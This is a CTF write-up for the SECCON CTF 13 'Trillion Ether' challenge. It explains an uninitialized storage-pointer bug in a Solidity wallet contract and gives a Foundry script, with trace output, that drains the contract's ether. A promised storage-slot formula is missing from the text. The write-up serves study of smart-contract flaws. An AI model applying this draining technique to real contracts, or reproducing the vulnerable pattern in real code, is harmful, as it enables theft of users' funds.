---
layout: post
title: "SECCON CTF 13 Quals Writeup"
categories: 
  - Writeup
  - blockchain
author: Songhyun Bae
---

I recently participated in the SECCON CTF 13 Qualifiers with my team, CyKor. I solved the “Trillion Ether” challenge in the blockchain category. I’m planning to write about it on my blog.


## **Trillion Ether**
> Get Chance!

Below is the code for the challenge. The contract allows the creation of wallets and includes `withdraw` and `transfer` functionalities. To solve the challenge, it is necessary to drain all the funds from the contract.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

contract TrillionEther {
    struct Wallet {
        bytes32 name;
        uint256 balance;
        address owner;
    }

    Wallet[] public wallets;

    constructor() payable {
        require(msg.value == 1_000_000_000_000 ether);
    }

    function isSolved() external view returns (bool) {
        return address(this).balance == 0;
    }

    function createWallet(bytes32 name) external payable {
        wallets.push(_newWallet(name, msg.value, msg.sender));
    }

    function transfer(uint256 fromWalletId, uint256 toWalletId, uint256 amount) external {
        require(wallets[fromWalletId].owner == msg.sender, "not owner");
        wallets[fromWalletId].balance -= amount;
        wallets[toWalletId].balance += amount;
    }

    function withdraw(uint256 walletId, uint256 amount) external {
        require(wallets[walletId].owner == msg.sender, "not owner");
        wallets[walletId].balance -= amount;
        payable(wallets[walletId].owner).transfer(amount);
    }

    function _newWallet(bytes32 name, uint256 balance, address owner) internal returns (Wallet storage wallet) {
        wallet = wallet;
        wallet.name = name;
        wallet.balance = balance;
        wallet.owner = owner;
    }
}
```

The most apparent bug exists in the _newWallet function, where an uninitialized storage variables bug occurs. The wallet variable is declared as storage but is not properly initialized before assignment. Consequently, the data is written starting from storage slot 0.

```
function _newWallet(bytes32 name, uint256 balance, address owner) internal returns (Wallet storage wallet) {
    wallet = wallet;
    wallet.name = name;
    wallet.balance = balance;
    wallet.owner = owner;
}
```

In the TrillionEther contract, storage slot 0 holds the wallets array. Being a dynamic array, this slot stores the array’s length, and the actual elements are stored starting from keccak(0).

```
$ forge inspect TrillionEther storage-layout --pretty
| Name    | Type                          | Slot | Offset | Bytes | Contract                            |
|---------|-------------------------------|------|--------|-------|-------------------------------------|
| wallets | struct TrillionEther.Wallet[] | 0    | 0      | 32    | src/TrillionEther.sol:TrillionEther |
```

The wallets array consists of the Wallet struct, which occupies three storage slots for each element:
```
struct Wallet {
    bytes32 name;
    uint256 balance;
    address owner;
}

Wallet[] public wallets;
```

As a result, the storage slot for a new element in the array can be calculated using the formula:

By manipulating the array length in slot 0, we can cause an integer overflow during the multiplication step. This overflow allows us to overwrite the balance field of the Wallet struct with the owner address. By strategically creating wallets and controlling the overflow, we can target specific storage slots, overwrite critical data, and eventually drain all funds.

### Solution Script

Below is the exploit script that drains the contract:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";

import {TrillionEther} from "../src/TrillionEther.sol";

contract solve is Script {
    uint256 playerPrivateKey;
    address player;

    TrillionEther problemInstance;

    function setUp() external {
        string memory rpcUrl = "http://trillion-ether.seccon.games:8545/fcf85a4f-6b2f-4f81-aef5-e966d043277f";
        playerPrivateKey = 0x6d9be7bb251e23e43ac737e9ce272c97d11eb2d8164b70fd92242a076eab0d30;
        address problemContract = 0x775e072738D978416d8bc7805B8Cf4f34C0Bf80F;

        player = vm.addr(playerPrivateKey);
        vm.createSelectFork(rpcUrl);

        problemInstance = TrillionEther(problemContract);
    }

    function run() external {
        vm.startBroadcast(playerPrivateKey);

        problemInstance.createWallet{value: 0}(bytes32(uint256(1))); 
        problemInstance.createWallet{value: 0}(bytes32(uint256(38597363079105398474523661669562635951089994888546854679819194669304376546646)));
        
        problemInstance.withdraw(1, address(problemInstance).balance);

        vm.stopBroadcast();
    }
}
```

```
$ forge script solve -vvvv --broadcast
[⠊] Compiling...
No files changed, compilation skipped
Traces:
  [156386] solve::run()
    ├─ [0] VM::startBroadcast(<pk>)
    │   └─ ← [Return] 
    ├─ [93340] 0x775e072738D978416d8bc7805B8Cf4f34C0Bf80F::createWallet(0x0000000000000000000000000000000000000000000000000000000000000001)
    │   └─ ← [Stop] 
    ├─ [43240] 0x775e072738D978416d8bc7805B8Cf4f34C0Bf80F::createWallet(0x5555555555555555555555555555555555555555555555555555555555555556)
    │   └─ ← [Stop] 
    ├─ [8328] 0x775e072738D978416d8bc7805B8Cf4f34C0Bf80F::withdraw(1, 1000000000000000000000000000000 [1e30])
    │   ├─ [0] 0x6B4df773CB9AdA0515BBC8F4eB9e57C18cE54152::fallback{value: 1000000000000000000000000000000}()
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [0] VM::stopBroadcast()
    │   └─ ← [Return] 
    └─ ← [Stop] 
```

